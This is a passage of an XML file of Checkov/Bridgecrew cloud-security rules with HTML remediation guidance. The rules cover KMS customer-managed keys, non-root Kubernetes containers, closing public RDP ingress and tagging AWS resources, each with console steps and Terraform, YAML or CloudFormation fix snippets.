  backup_retention_period = 5
  preferred_backup_window = "07:00-09:00"
  skip_final_snapshot     = true
+ kms_key_id                        = "ckv_kms"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_102' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_102</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_102' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_33</key>
    <name>Ensure Alibaba Cloud Cypher Policy is secured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-cypher-policy-is-not-secured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-cypher-policy-is-not-secured"></div>Alibaba Cloud Cypher Policy is not secured</div><a aria-label="Skip link to Alibaba Cloud Cypher Policy is not secured" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-cypher-policy-is-not-secured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-cypher-policy-is-secured' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-cypher-policy-is-secured</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-cypher-policy-is-secured' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_81</key>
    <name>Ensure GCP Big Query Tables are encrypted with Customer Supplied Encryption Keys (CSEK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div>GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)</div><a aria-label="Skip link to GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)" class="heading-anchor-icon fa fa-anchor" href="#gcp-big-query-tables-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_6</key>
    <name>Do not admit root containers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="root-containers-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-root-containers-admitted"></div>Root containers admitted</div><a aria-label="Skip link to Root containers admitted" class="heading-anchor-icon fa fa-anchor" href="#root-containers-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In Kubernetes, a container's user ID table maps to the host's user table. Running a process as the root user inside a container runs it as root on the host. Many container images use the root user to run PID 1. If PID 1 is compromised, an attacker has root permissions in the container, and any misconfigurations can be exploited. </p>
<p>Containers that run as root frequently have more permissions than their workload requires which, in case of compromise, could help an attacker further their exploits.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Arguments</strong>:<br/>
runAsUser:rule:MustRunAsNonRoot - Unable containers to run with root privileges.<br/>
runAsUser:rule:MustRunAs - When the minimum range is set to 1 or higher, containers cannot run as root.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
    runAsUser:
+   rule: 'MustRunAsNonRoot'
or
    rule: 'MustRunAs'
    ranges:
+   - min: &lt;min user, 1 or higher&gt;
      max: &lt;max user&gt;
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> needs to grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_184</key>
    <name>Ensure EFS file system is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elastic-file-system-efs-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elastic-file-system-efs-not-encrypted-using-customer-managed-key"></div>AWS Elastic File System (EFS) not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS Elastic File System (EFS) not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-elastic-file-system-efs-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>AWS EFS Encryption of data at rest can only be enabled during file system creation. So to resolve this alert, create a new EFS with encryption enabled with the customer-managed key, then migrate all required data from the reported EFS to this newly created EFS and delete reported EFS.</p>
<p>To create new EFS with encryption enabled, perform the following:</p>
<ol>
<li>Sign into the AWS console</li>
<li>In the console, select the specific region from region drop down on the top right corner, for which the alert is generated</li>
<li>Navigate to EFS dashboard</li>
<li>Click on 'File systems' (Left Panel)</li>
<li>Click on 'Create file system' button</li>
<li>On the 'Configure file system access' step, specify EFS details as per your requirements and Click on 'Next Step'</li>
<li>On the 'Configure optional settings' step, Under 'Enable encryption' Choose 'Enable encryption of data at rest' and Select customer managed key [i.e. Other than (default)aws/elasticfilesystem] from 'Select KMS master key' dropdown list along with other parameters and Click on 'Next Step'</li>
<li>On the 'Review and create' step, Review all your setting and Click on 'Create File System' button</li>
</ol>
<p>To delete reported EFS which does not has encryption, perform the following:</p>
<ol>
<li>Sign into the AWS console</li>
<li>In the console, select the specific region from region drop down on the top right corner, for which the alert is generated</li>
<li>Navigate to EFS dashboard</li>
<li>Click on 'File systems' (Left Panel)</li>
<li>Select the reported file system</li>
<li>Click on 'Actions' drop-down</li>
<li>Click on 'Delete file system'</li>
<li>In the 'Permanently delete file system' popup box, To confirm the deletion enter the file system's ID and Click on 'Delete File System</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_efs_file_system</li>
<li><strong>Arguments</strong>: encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_efs_file_system" "enabled" {
  creation_token = "example"
  kms_key_id = &lt;kms key&gt;
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_104' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_104</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_104' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_185</key>
    <name>Ensure Kinesis Stream is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-kinesis-streams-encryption-is-using-default-kms-keys-instead-of-customers-managed-master-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-kinesis-streams-encryption-is-using-default-kms-keys-instead-of-customers-managed-master-keys"></div>AWS Kinesis streams encryption is using default KMS keys instead of Customer's Managed Master Keys</div><a aria-label="Skip link to AWS Kinesis streams encryption is using default KMS keys instead of Customer's Managed Master Keys" class="heading-anchor-icon fa fa-anchor" href="#aws-kinesis-streams-encryption-is-using-default-kms-keys-instead-of-customers-managed-master-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the AWS Kinesis streams which are encrypted with default KMS keys and not with Master Keys managed by Customer. It is a best practice to use customer managed Master Keys to encrypt your Amazon Kinesis streams data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Sign in to the AWS Console</li>
<li>Go to Kinesis Service</li>
<li>Select the reported Kinesis data stream for the corresponding region</li>
<li>Under Server-side encryption, Click on Edit</li>
<li>Choose Enabled</li>
<li>Under KMS master key, You can choose any KMS other than the default (Default) aws/kinesis</li>
<li>Click Save</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_kinesis_stream</li>
<li><strong>Arguments</strong>: kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kinesis_stream" "pass" {
  ...
  kms_key_id      = aws_kms_key.sse_aws_kms_key_id.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_105' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_105</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_105' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_186</key>
    <name>Ensure S3 bucket Object is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-s3-object-copy-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-s-3-object-copy-not-encrypted-using-customer-managed-key"></div>AWS S3 Object Copy not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS S3 Object Copy not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-s3-object-copy-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that the S3 bucket Object is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the object.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: aws_s3_bucket_object</li>
<li>Attribute: kms_key_id - (Optional) Specifies the AWS KMS Key ARN to use for object encryption. This value is a fully qualified ARN of the KMS Key. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket_object" "object" {
  bucket = "your_bucket_name"
  key    = "new_object_key"
  source = "path/to/file"
+ kms_key_id = "ckv_kms"

  # The filemd5() function is available in Terraform 0.11.12 and later
  # For Terraform 0.11.11 and earlier, use the md5() function and the file() function:
  # etag = "${md5(file("path/to/file"))}"
  etag = filemd5("path/to/file")
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_106' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_106</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_106' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_25</key>
    <name>Ensure Security Groups do not allow ingress from 0.0.0.0/0 to port 3389</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-groups-allow-ingress-from-00000-to-port-3389"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-groups-allow-ingress-from-0-0-0-0-0-to-port-3389"></div>Security Groups allow ingress from 0.0.0.0/0 to port 3389</div><a aria-label="Skip link to Security Groups allow ingress from 0.0.0.0/0 to port 3389" class="heading-anchor-icon fa fa-anchor" href="#security-groups-allow-ingress-from-00000-to-port-3389"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Security groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. We recommend that security groups do not allow unrestricted ingress access to port 3389. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rationale"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rationale"></div>Rationale</div><a aria-label="Skip link to Rationale" class="heading-anchor-icon fa fa-anchor" href="#rationale"></a></h1>
<p>Removing unfettered connectivity to remote console services, such as RDP, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime-remediation"></div>Fix - Runtime Remediation</div><a aria-label="Skip link to Fix - Runtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To implement the prescribed state, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/vpc/" target="_self">Amazon VPC console</a>.</li>
<li>In the left pane, click <strong>Security Groups</strong>. </li>
<li>For each security group, perform the following:<br/>
a) Select the <em>security group</em>.<br/>
b) Click <strong>Inbound Rules</strong>.<br/>
c) Identify the rules to be removed.<br/>
d) Click <strong>X</strong> in the Remove column.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-remediation"></div>Fix - Buildtime Remediation</div><a aria-label="Skip link to Fix - Buildtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>The issue is the CIDR specified in the ingress control rule - "0.0.0.0/0". Change it from this:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_security_group.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_security_group.tf">resource "aws_security_group" "example" {
  ...
  ingress {
    from_port   = 3389
    to_port     = 3389
    protocol    = "tcp"
-   cidr_blocks = ["0.0.0.0/0"]
+   cidr_blocks = ["10.0.0.1/32"]
  }  
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::EC2::SecurityGroup</li>
<li><strong>Argument:</strong> Properties.SecurityGroupIngress</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::EC2::SecurityGroup
    Properties:
      ...
      SecurityGroupIngress:
      - Description: SSH Ingress
        IpProtocol: tcp
        FromPort: 3389
        ToPort: 3389
-       CidrIp: "0.0.0.0/0"
+       CidrIp: "10.10.10.0/24"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_2' target='_blank'> https://docs.bridgecrew.io/docs/networking_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_CUSTOM_1</key>
    <name>Ensure AWS resources that support tags have Tags</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-resources-that-support-tags-do-not-have-tags"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-resources-that-support-tags-do-not-have-tags"></div>AWS resources that support tags do not have Tags</div><a aria-label="Skip link to AWS resources that support tags do not have Tags" class="heading-anchor-icon fa fa-anchor" href="#aws-resources-that-support-tags-do-not-have-tags"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Many different types of AWS resources support tags. Tags allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that tags can be used, we recommend you follow a tagging practice.</p>
<p>View AWS's recommended tagging best practices <a href="https://d1.awsstatic.com/whitepapers/aws-tagging-best-practices.pdf" target="_self">here</a>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>The procedure varies by resource type. Tags can be added in the AWS console by navigating to the specific resource. There is usually a "tags" tab in the resource view that can be used to view and modify tags.</p>
<p>Example to edit tags for a Security Group:</p>
<ol>
<li>Navigate to the <strong><a href="https://console.aws.amazon.com/ec2/v2/home#Home:" target="_self">Amazon EC2 console</a></strong>.</li>
<li>Select <strong>Security groups</strong></li>
<li>Select a security group to edit, then click the <strong>Tags</strong> tab.</li>
<li>Click <strong>Manage tags</strong>, then <strong>Add new tag</strong> to add a tag.</li>
<li>Click <strong>Save changes</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The following command shows how to add tags for any resource associated with the EC2 service (in this case, a security group). The specific command varies by resource type for non-EC2 services (e.g., RDS).</p>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws ec2 create-tags --resources sg-000b51bf43c710838 --tags Key=Environment,Value=Dev</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>The example below shows how to tag a security group in Terraform. The syntax is generally the same for any taggable resource type.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_security_group" "sg" {
  name = "my-sg"
  ...
+ tags = {
+   Environment = "dev"
+   Owner = "apps-team"
+ }
}
